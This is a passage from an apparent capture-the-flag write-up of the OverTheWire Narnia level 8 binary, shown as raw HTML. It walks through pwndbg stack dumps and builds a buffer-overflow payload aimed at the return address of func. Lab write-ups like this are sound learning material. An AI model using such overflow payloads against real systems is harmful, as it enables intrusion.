&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Breakpoint </span><span class="c8">1</span><span class="c3">, </span><span class="c8">0</span><span class="c3">x0804848d </span><span class="c6">in</span><span class="c3">&nbsp;</span><span class="c6">func</span><span class="c3">&nbsp;() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><h5 class="c75 c85" id="h.mrfnk3uaha0s"><span class="c30"></span></h5><h5 class="c58" id="h.9w58qw4azn9y"><span class="c30">Local_8 Address Behavior</span></h5><p class="c0"><span>The stack pointer can now be analyzed:</span></p><a id="t.1dad3b3b800242340c0d297aa68e673544fa8c71"></a><a id="t.87"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/40x $</span><span class="c8">esp</span><span class="c3"><br></span><span class="c8">0xffffd044</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000041</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3"><br></span><span class="c8">0xffffd054</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd2f9</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd068</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x080484a7</span><span class="c3"><br></span><span class="c8">0xffffd064</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xffffd2f9</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7ddfe46</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000002</span><span class="c3"><br></span><span class="c8">0xffffd074</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xffffd114</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd120</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd0a4</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd0b4</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Note how there are 5 A&rsquo;s starting at </span><span class="c8">0xffffd044</span><span>&nbsp;followed by 15 0 bytes. The 0&rsquo;s are a result of the memset function. These 0&rsquo;s are then followed by the </span><span class="c8">0xffffd2f9</span><span class="c2">&nbsp;address. Examining this address reveals that it is pointing to the local_8 buffer:</span></p><a id="t.522a739e21b73bf5246c553e04a82a2a207b96e0"></a><a id="t.88"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/s </span><span class="c8">0xffffd2f</span><span class="c3">9<br></span><span class="c8">0xffffd2f</span><span class="c3">9: &nbsp; &nbsp; </span><span class="c11">&quot;AAAAA&quot;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Interestingly, running the program again but inputting 6 A&rsquo;s instead of 5 results in a decrement of 1 to the local_8 address:</span></p><a id="t.81c7c2d01e40542b5c56269051e39c799f225cb1"></a><a id="t.89"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/40x $</span><span class="c8">esp</span><span class="c3"><br></span><span class="c8">0xffffd044</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00004141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3"><br></span><span class="c8">0xffffd054</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd2f8</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd068</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x080484a7</span><span class="c3"><br></span><span class="c8">0xffffd064</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xffffd2f8</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7ddfe46</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000002</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Furthermore, when inputting more than 20 bytes, the address of local_8 gets overwritten by one byte:</span></p><a id="t.02406995abe7b6835cce1dfe6982c91d8b4631d4"></a><a id="t.90"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">0</span><span class="c3">xffffd034: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffd044: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffd241 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">xffffd058 &nbsp; &nbsp; &nbsp;</span><span class="c8">0</span><span class="c3">x</span><span class="c8">080484a7</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">However, when exactly 20 bytes are inputted followed by the address of local_8 and some junk, we are able to flood into other areas of memory:</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c1">Payload:</span></p><p class="c25"><span class="c1">A*20 + ADDRESS_TO_LOCAL_8 + &lsquo;A&rsquo;*6</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span>When we passed 6 A&rsquo;s into the buffer, the address to local_8 was </span><span class="c27">0xfffd2f8</span><span class="c2">. If we are to input 14 more A&rsquo;s followed by the address to local_8 (which is four bytes) followed by another 6 A&rsquo;s, then the resulting address to local_8 would be 0xffffd2f8 - (14+4+6). </span></p><a id="t.881ad7920766b5472e4346d4b17348dc8bdaeb22"></a><a id="t.91"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">&gt;&gt;</span><span class="c3">&gt; hex(</span><span class="c8">0xffffd2f8</span><span class="c3">-</span><span class="c8">24</span><span class="c3">)<br></span><span class="c11">&#39;0xffffd2e0&#39;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Using this address, we can construct the payload as follows:</span></p><a id="t.7371658ee1eb7aaf5b755bb68fa90a01a85172c9"></a><a id="t.92"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; r $(python -c </span><span class="c11">&quot;print &#39;A&#39;*20+&#39;\xe0\xd2\xff\xff&#39;+&#39;A&#39;*6&quot;</span><span class="c3">)<br>Starting program: </span><span class="c12">/home/</span><span class="c8">0</span><span class="c3">xd4y</span><span class="c12">/business/</span><span class="c3">other</span><span class="c12">/overthewire/</span><span class="c3">narnia</span><span class="c12">/8/</span><span class="c3">narnia8 $(python -c </span><span class="c11">&quot;print &#39;A&#39;*20+&#39;\xe0\xd2\xff\xff&#39;+&#39;A&#39;*6&quot;</span><span class="c3">)<br>AAAAAAAAAAAAAAAAAAAAAAAAAA<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Breakpoint </span><span class="c8">1</span><span class="c3">, </span><span class="c8">0</span><span class="c3">x0804848d </span><span class="c6">in</span><span class="c3">&nbsp;</span><span class="c6">func</span><span class="c3">&nbsp;() &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Now looking at the stack pointer, we see that we have successfully flooded memory past the local_8 address:</span></p><a id="t.274295927dc57b3ab2fec205200a3d78f45ad3e1"></a><a id="t.93"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/</span><span class="c8">40</span><span class="c3">x $esp<br></span><span class="c8">0</span><span class="c3">xffffd024: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffd034: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffd2e0 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x08044141</span><span class="c3"><br></span><span class="c8">0</span><span class="c3">xffffd044: &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xffffd2e0 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0</span><span class="c3">xf7ddfe46 &nbsp; &nbsp; &nbsp;</span><span class="c8">0x00000002</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Incidentally, the reason why we were only able to overwrite other areas of memory only after including the address of the buffer in the payload, is because of the for loop within the program. When the address to local_8 is overwritten, the for loop is false and data stops getting written to local_1c.</span></p><h5 class="c58" id="h.j10h1qzdlbsf"><span class="c30">Overwriting func Return Address</span></h5><p class="c0"><span class="c2">It is important to note that in the stack pointer, the return address of func is present shortly after the buffer:</span></p><a id="t.988b5dd786aa23efeef636c83ea4c9db0f68ea7b"></a><a id="t.94"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/40x $</span><span class="c8">esp</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd034</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd044</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x41414141</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd2ea</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd058</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x080484a7</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd054</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xffffd2ea</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7ddfe46</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000002</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd064</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xffffd104</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd110</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd094</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd0a4</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd074</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xf7ffdb40</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7fcb410</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000001</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd084</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xffffd0e8</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7ffd000</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd094</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7fa6000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd0a4</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xe752d891</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xa309e681</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c8">0xffffd0b4</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000002</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x08048320</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000000</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0xffffd0c4</span><span class="c3">: &nbsp; &nbsp; </span><span class="c8">0xf7fe9740</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7fe4080</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0xf7ffd000</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c8">0x00000002</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>More specifically, it is at </span><span class="c8">0x080484a7</span><span class="c2">.</span></p><a id="t.85812de2f43a4b3d1723a47962542e1f7fcd6725"></a><a id="t.95"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; x/x </span><span class="c8">0x080484a7</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></span><span class="c8">0x80484a7</span><span class="c3">&nbsp;&lt;main+</span><span class="c8">23</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c8">0x83</span><span class="c3">&nbsp; &nbsp;</span></p><p class="c7"><span class="c2"></span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">We can verify that this is the return address of func by disassembling the main function:</span></p><a id="t.39ce936a177cc572cc1dbf7ce7620494011cccb2"></a><a id="t.96"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">pwndbg&gt; disass main<br>Dump of assembler code for function main:<br> &nbsp; </span><span class="c8">0x08048490</span><span class="c3">&nbsp;&lt;+</span><span class="c8">0</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">ebp</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048491</span><span class="c3">&nbsp;&lt;+</span><span class="c8">1</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">ebp</span><span class="c3">,</span><span class="c8">esp</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048493</span><span class="c3">&nbsp;&lt;+</span><span class="c8">3</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">cmp</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">+</span><span class="c8">0x8</span><span class="c3">],</span><span class="c8">0x1</span><span class="c3"><br> &nbsp; </span><span class="c8">0x08048497</span><span class="c3">&nbsp;&lt;+</span><span class="c8">7</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">jle</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">0x80484ac</span><span class="c3">&nbsp;&lt;main+</span><span class="c8">28</span><span class="c3">&gt;<br> &nbsp; </span><span class="c8">0x08048499</span><span class="c3">&nbsp;&lt;+</span><span class="c8">9</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">ebp</span><span class="c3">+</span><span class="c8">0xc</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x0804849c</span><span class="c3">&nbsp;&lt;+</span><span class="c8">12</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">0x4</span><span class="c3"><br> &nbsp; </span><span class="c8">0x0804849f</span><span class="c3">&nbsp;&lt;+</span><span class="c8">15</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">eax</span><span class="c3">,</span><span class="c8">DWORD</span><span class="c3">&nbsp;</span><span class="c8">PTR</span><span class="c3">&nbsp;[</span><span class="c8">eax</span><span class="c3">]<br> &nbsp; </span><span class="c8">0x080484a1</span><span class="c3">&nbsp;&lt;+</span><span class="c8">17</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">eax</span><span class="c3"><br> &nbsp; </span><span class="c8">0x080484a2</span><span class="c3">&nbsp;&lt;+</span><span class="c8">18</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">call</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x804841b</span><span class="c3">&nbsp;&lt;func&gt;<br> &nbsp; </span><span class="c8">0x080484a7</span><span 